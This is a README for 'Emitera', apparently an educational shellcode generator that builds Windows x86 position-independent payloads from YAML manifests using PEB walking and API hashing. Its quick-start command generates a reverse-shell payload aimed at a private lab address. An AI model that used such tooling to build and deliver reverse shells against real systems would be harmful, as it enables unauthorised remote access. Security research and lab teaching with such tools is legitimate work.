# Emitera

Multi-architecture shellcode emitter for educational security research.

Generates position-independent shellcode from YAML manifests via PEB walking
and ROR13 API hashing. Currently supports Windows x86, with x64 and additional
targets planned.

## Quick start

```bash
uv sync
uv run emitera emitera/manifests/revshell.yaml \
    --lhost 192.168.1.100 --lport 9001 --out emitter_out/
```

Assembly requires Keystone or NASM (available on the Windows lab VM).
Use `--no-assemble` to generate `.asm` source without assembling.

## Tests

```bash
uv run pytest
```

Tests that require an assembler (`test_full_build_assembles`) are expected
to fail on Mac.
